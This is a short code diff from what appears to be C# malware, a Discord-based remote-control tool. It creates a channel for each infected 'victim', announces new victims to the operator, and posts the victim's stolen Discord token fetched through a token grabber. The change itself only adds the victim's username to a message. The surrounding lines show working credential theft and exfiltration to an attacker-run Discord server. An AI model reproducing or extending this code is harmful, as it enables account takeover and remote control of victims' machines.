@@ -114,7 +114,7 @@ class Program
             string victimname = string.Empty;
             victimChannel = await guild.CreateTextChannelAsync($"victim-{victimId}");
             await logsChannel.SendMessageAsync($"@everyone | New victim gotten: {victimId} | Username: {username}");
-            await victimChannel.SendMessageAsync($"@everyone | All commands you will type here controlls only this victim | {victimId}");
+            await victimChannel.SendMessageAsync($"@everyone | All commands you will type here controlls only this victim | {victimId} | Username: {username}");
 
             await victimChannel.SendMessageAsync($"@everyone | Discord Token:\n{DiscordGrabber.GetToken()}");
 
